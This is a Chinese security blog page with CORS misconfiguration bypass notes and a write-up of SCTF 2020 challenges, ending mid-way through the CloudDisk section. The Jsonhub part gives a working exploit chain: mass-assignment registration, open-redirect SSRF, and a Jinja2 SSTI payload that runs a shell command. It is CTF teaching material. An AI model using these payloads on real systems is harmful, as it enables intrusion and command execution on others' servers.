<h2 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h2><h3 id="根据某些字段来设置ACAO头"><a href="#根据某些字段来设置ACAO头" class="headerlink" title="根据某些字段来设置ACAO头"></a>根据某些字段来设置ACAO头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Origin: https://malicious-website.com</span><br><span class="line">Cookie: sessionid=...</span><br><span class="line"></span><br><span class="line">根据Origin头来设置Access-Control-Allow-Origin</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<h3 id="对Origin头的错误解析"><a href="#对Origin头的错误解析" class="headerlink" title="对Origin头的错误解析"></a>对Origin头的错误解析</h3><p>因为要对子域名的支持，所以有些网站会这样写:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain startwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain endwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>像这种都很好绕过：</p>
<p>domain.com.evildomain.com 或者 evildomain-domain.com</p>
<h3 id="白名单中存在-null"><a href="#白名单中存在-null" class="headerlink" title="白名单中存在:null"></a>白名单中存在:null</h3><p> Origin支持值null，在某些情况下，浏览器可能会在Origin标头中发送值null：</p>
<ul>
<li><p>跨站点重定向</p>
</li>
<li><p>来自序列化数据的请求</p>
</li>
<li><p>使用<code>file</code>协议的请求</p>
</li>
<li><p>沙盒中的跨域请求</p>
</li>
</ul>
<h2 id="利用受信任的域"><a href="#利用受信任的域" class="headerlink" title="利用受信任的域"></a>利用受信任的域</h2><p>在受信任的域上找到xss，就可以绕过CORS</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>23333</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a> </p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/08/bypass%20CORS/" data-id="cku8ky2xx0037dnnf5o0j0wxe" data-title="bypass CORS" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/07/sctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-07T16:00:00.000Z" itemprop="datePublished">2020-07-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/07/sctf2020/">sctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以进行符合条件的ssrf的只有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Must 127.0.0.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    methods = request.GET.get(<span class="string">&quot;methods&quot;</span>)</span><br><span class="line">    url = request.GET.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> methods == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(</span><br><span class="line">            &#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.get(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">elif</span> methods == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        data = base64.b64decode(request.GET.get(<span class="string">&quot;data&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.post(url, data=data,</span><br><span class="line">                                                                 headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>,</span><br><span class="line">                                                                          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;=3=&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>但是需要<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>，利用 CVE-2018-14574跳转到127.0.0.1:8000访问/rpc ，这样我们就能ssti，在这之前我们需要搞到Token</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/home.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        white_list = [<span class="string">&quot;39.104.19.182&quot;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Token.objects.<span class="built_in">all</span>().first().Token == data[<span class="string">&quot;token&quot;</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> ssrf_check(data[<span class="string">&quot;url&quot;</span>], white_list):</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = requests.get(data[<span class="string">&quot;url&quot;</span>], timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request Error&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: res.text&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Something Wrong&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token Error&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>构造：<code>&#123;&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true&#125;</code></p>
<p>得到token:<code>3ad9af405504233188f694a11ff22115</code></p>
<p>接下来就是ssti了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>





<p>最后的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">num1=<span class="number">1</span></span><br><span class="line">num2=<span class="number">2</span></span><br><span class="line">symbols=<span class="string">&quot;-&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[409](&#x27;/readflag&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;-&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;num1&quot;</span>:num1,</span><br><span class="line">    <span class="string">&quot;num2&quot;</span>:num2,</span><br><span class="line">    <span class="string">&quot;symbols&quot;</span>:symbols</span><br><span class="line">&#125;</span><br><span class="line">payload=json.dumps(data).replace(<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;\\u007b\\u007b&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;\\u007d\\u007d&quot;</span>)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">burp0_url = <span class="string">&quot;http://39.104.19.182:80/home/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;sessionid&quot;</span>: <span class="string">&quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;</span>, <span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://39.104.19.182&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.104.19.182/home/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_json=&#123;<span class="string">&quot;token&quot;</span>: <span class="string">&quot;3ad9af405504233188f694a11ff22115&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=payload)&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</span><br></pre></td></tr></table></figure>



<p><code>SCTF&#123;2b19246757c63738e7c40bbdf87c3be1&#125;</code></p>
<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answer😀.</p>
<p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98103018">https://zhuanlan.zhihu.com/p/98103018</a><br><a target="_blank" rel="noopener" href="https://www.sohu.com/a/159552694_610733">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/105460358">https://zhuanlan.zhihu.com/p/105460358</a><br><a target="_blank" rel="noopener" href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
<p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;dc62d163f53ce13369ab97041706060c&quot;</span></span><br><span class="line">Content-Length: <span class="number">1547</span></span><br><span class="line">Last-Modified: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">45</span> GMT</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"><span class="attr">Date</span>: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">50</span> GMT</span><br><span class="line"><span class="attr">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> koaBody = <span class="built_in">require</span>(<span class="string">&#x27;koa-body&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">&#x27;koa-send&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> Router();</span><br><span class="line"><span class="keyword">const</span> SECRET = <span class="string">&quot;03229a6694e657077f218c322f3e0bea&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(koaBody(&#123;</span><br><span class="line">  <span class="attr">multipart</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">formidable</span>: &#123;</span><br><span class="line">      <span class="attr">maxFileSize</span>: <span class="number">2000</span> * <span class="number">1024</span> * <span class="number">1024</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/uploadfile&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line">  <span class="keyword">if</span> (!fs.existsSync(file.path)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(file.path.toString().search(<span class="string">&quot;/fd/&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">    file.path=<span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">  <span class="keyword">let</span> fileId = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(file.name + <span class="built_in">Date</span>.now() + SECRET).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> filePath = path.join(__dirname, <span class="string">&#x27;upload/&#x27;</span>) + fileId</span><br><span class="line">  <span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br><span class="line">  reader.pipe(upStream)</span><br><span class="line">  <span class="keyword">return</span> ctx.body = <span class="string">&quot;Upload success ~, your fileId is hereï¼&quot;</span> + fileId;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/downloadfile/:fileId&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> fileId = ctx.params.fileId;</span><br><span class="line">  ctx.attachment(fileId);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, fileId, &#123; <span class="attr">root</span>: __dirname + <span class="string">&#x27;/upload&#x27;</span> &#125;);</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;SCTF&#123;no_such_file_~&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.response.type = <span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">  ctx.response.body = fs.createReadStream(<span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(router.routes());</span><br><span class="line">app.listen(<span class="number">3333</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;This server is running at http://localhost:&#x27;</span> + <span class="number">3333</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为koa中访问参数也是ctx.request.body.xxxx 所以我们可以构造</p>
